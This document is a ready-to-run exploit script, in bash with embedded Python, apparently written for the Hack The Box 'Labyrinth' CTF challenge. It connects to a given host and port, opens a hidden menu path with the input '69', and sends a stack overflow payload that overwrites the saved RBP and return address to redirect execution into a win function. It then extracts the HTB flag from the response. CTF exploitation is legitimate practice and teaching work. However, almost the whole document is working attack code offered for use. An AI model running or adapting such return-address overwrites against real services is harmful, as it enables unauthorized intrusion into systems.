#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Labyrinth
# Type: Hidden branch + stack overflow + controlled return into win path
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=8
readonly DEFAULT_STAGE_DELAY=0.30

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
STAGE_DELAY="${DEFAULT_STAGE_DELAY}"
JSON_OUTPUT=0
VERBOSE=0

# Tunables for exploit internals.
FAKE_RBP_HEX="0x404150"
WIN_MID_HEX="0x401287"

usage() {
  cat <<USAGE
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>              Target host/IP
  --port <port>              Target TCP port
  --timeout <seconds>        Socket timeout (default: ${DEFAULT_TIMEOUT})
  --stage-delay <seconds>    Delay between interaction stages (default: ${DEFAULT_STAGE_DELAY})
  --fake-rbp <hex>           Overwritten saved RBP (default: ${FAKE_RBP_HEX})
  --ret <hex>                Overwritten saved RIP (default: ${WIN_MID_HEX})
  --json                     Print result as JSON
  --verbose                  Enable debug output
  -h, --help                 Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/protocol failure
  4  Exploit sent but flag not found
USAGE
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --stage-delay)
        STAGE_DELAY="${2:-}"
        shift 2
        ;;
      --fake-rbp)
        FAKE_RBP_HEX="${2:-}"
        shift 2
        ;;
      --ret)
        WIN_MID_HEX="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -* )
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi

  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi

  if ! [[ "${FAKE_RBP_HEX}" =~ ^0x[0-9a-fA-F]+$ ]]; then
    log_error "Invalid --fake-rbp value: ${FAKE_RBP_HEX}"
    exit 2
  fi

  if ! [[ "${WIN_MID_HEX}" =~ ^0x[0-9a-fA-F]+$ ]]; then
    log_error "Invalid --ret value: ${WIN_MID_HEX}"
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${HOST}:${PORT}"
  log_debug "Using hidden door 69, fake RBP ${FAKE_RBP_HEX}, return ${WIN_MID_HEX}"

  python3 - "$HOST" "$PORT" "$TIMEOUT" "$STAGE_DELAY" "$FAKE_RBP_HEX" "$WIN_MID_HEX" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
import json
import re
import socket
import struct
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
stage_delay = float(sys.argv[4])
fake_rbp = int(sys.argv[5], 16)
win_mid = int(sys.argv[6], 16)
json_output = sys.argv[7] == "1"
verbose = sys.argv[8] == "1"


def emit_debug(msg: str) -> None:
    if verbose and not json_output:
        print(f"[D] {msg}", file=sys.stderr)


def fail(code: int, msg: str) -> None:
    if json_output:
        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
    else:
        print(f"[-] {msg}", file=sys.stderr)
    raise SystemExit(code)


# Main overflow payload for second prompt after door 69.
payload = b"A" * 48
payload += struct.pack("<Q", fake_rbp)
payload += struct.pack("<Q", win_mid)
payload += b"\n"

emit_debug(f"Payload length: {len(payload)}")
emit_debug(f"fake_rbp={hex(fake_rbp)} win_mid={hex(win_mid)}")

try:
    sock = socket.create_connection((host, port), timeout=timeout)
except Exception as exc:
    fail(3, f"Connection failed: {exc}")

try:
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)

    # Best-effort read of banner/door menu.
    try:
        banner = sock.recv(65535)
        emit_debug(f"Initial banner bytes: {len(banner)}")
    except Exception:
        emit_debug("No initial banner received before timeout")

    # Stage 1: open the hidden vulnerable path.
    time.sleep(stage_delay)
    sock.sendall(b"69\n")

    # Stage 2: overflow saved RBP/RIP at hidden fgets.
    time.sleep(stage_delay)
    sock.sendall(payload)

    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
finally:
    sock.close()

text = b"".join(chunks).decode("latin1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", text)

if not match:
    if verbose and not json_output:
        print("[D] Response preview:", file=sys.stderr)
        print(text[:800], file=sys.stderr)
    fail(4, "Flag pattern not found in target response")

flag = match.group(0)

if json_output:
    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
else:
    print(flag)
PY
}

main "$@"
